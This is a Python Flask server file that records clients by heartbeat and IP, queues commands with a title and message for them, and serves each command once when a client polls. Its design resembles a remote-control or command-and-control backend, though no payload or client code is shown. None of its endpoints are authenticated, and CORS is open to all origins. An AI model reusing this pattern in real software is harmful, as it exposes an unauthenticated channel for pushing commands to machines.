from flask import Flask, request, jsonify
from flask_cors import CORS # Import CORS
import time # Import time for last_seen timestamp

app = Flask(__name__)
CORS(app) # Enable CORS for all origins
client_commands = {}
connected_clients = {} # New dictionary to store connected clients

@app.route('/health')
def health_check():
    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.form # Heartbeat sends form data
    client_id = data.get('client_id')
    ip = data.get('ip')
    
    if client_id:
        connected_clients[client_id] = {"ip": ip, "status": "online", "last_seen": time.time()}
        print(f"Heartbeat from {client_id} (IP: {ip}). Clients online: {len(connected_clients)}")
    return jsonify({"status": "ok"})

@app.route('/send-command', methods=['POST'])
def send_command():
    data = request.get_json() # Expect JSON data from web interface
    client_id = data.get("client_id")
    cmd = data.get("cmd")
    title = data.get("title", "") # Get title, default empty string
    message = data.get("message", "") # Get message, default empty string

    if client_id and cmd:
        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message}
        print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}') received.")
        return jsonify({"status": "success", "message": "Command received"}), 200
    print(f"Invalid command data received: {data}")
    return jsonify({"status": "error", "message": "Invalid command data"}), 400

@app.route('/get-command')
def get_command():
    client_id = request.args.get('client_id')
    if client_id in client_commands:
        command_data = client_commands.pop(client_id) # Get and remove the command
        print(f"Sending command '{command_data.get('cmd')}' to client {client_id}")
        return jsonify(command_data)
    
    print(f"No command for client {client_id}")
    return jsonify({"cmd": "", "title": "", "message": ""}) # Return empty JSON if no command

@app.route('/get-clients')
def get_clients():
    # In a real app, you might want to filter out old/disconnected clients here
    # For now, return all clients that have sent a heartbeat recently
    print(f"Returning {len(connected_clients)} connected clients.")
    return jsonify(connected_clients)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
